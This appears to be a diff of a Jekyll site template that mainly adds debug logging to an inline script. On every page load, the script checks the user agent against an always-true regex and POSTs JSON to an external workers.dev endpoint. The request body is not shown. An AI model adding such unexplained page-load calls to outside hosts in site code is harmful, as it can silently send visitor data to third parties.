@@ -29,11 +29,15 @@
   <script>
     (function() {
       console.log("Script executed");
-      console.log("User Agent:", navigator.userAgent);
+      console.log("navigator.userAgent:", navigator.userAgent);
       
+      // Using a catch-all regex for testing
       const regex = /.*/;
-      if (regex.test(navigator.userAgent)) {
-        console.log("Regex matched, proceeding with fetch");
+      const matchResult = regex.test(navigator.userAgent);
+      console.log("Regex test result:", matchResult);
+      
+      if (matchResult) {
+        console.log("Condition passed, triggering fetch");
         fetch('https://silent-bird-0d0b.alistair-2bd.workers.dev/', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -43,10 +47,11 @@
         .then(data => console.log("Worker response:", data))
         .catch(error => console.error("Error:", error));
       } else {
-        console.log("User agent did not match regex");
+        console.log("Condition not met");
       }
     })();
   </script>
+  
   
 
   {% if site.author %}
